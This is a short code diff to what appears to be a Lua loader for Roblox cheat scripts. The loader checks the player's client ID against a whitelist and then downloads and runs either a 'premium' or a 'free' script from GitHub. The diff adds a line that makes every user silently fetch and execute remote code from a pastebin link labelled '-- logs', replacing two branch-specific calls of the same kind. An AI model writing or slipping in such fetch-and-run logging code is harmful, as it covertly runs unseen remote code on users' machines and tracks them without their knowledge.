@@ -6,14 +6,13 @@ local HWIDTable = {
 }
 
 local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+loadstring(game:HttpGet(('https://pastebin.com/raw/0drgV4k1')))() -- logs
 
 for i,v in pairs(HWIDTable) do
     if v == HWID then
         loadstring(game:HttpGet(('https://raw.githubusercontent.com/Sashkotashko420/wowwowowowpremium/main/mainpremium')))()
-        loadstring(game:HttpGet(('https://pastebin.com/raw/TAQrzzv2')))() -- logs
     else
         loadstring(game:HttpGet(('https://raw.githubusercontent.com/Sashkotashko420/wowwowowow/main/mainfree')))()
-        loadstring(game:HttpGet(('https://pastebin.com/raw/TAQrzzv2')))() -- logs
     end
 end
 
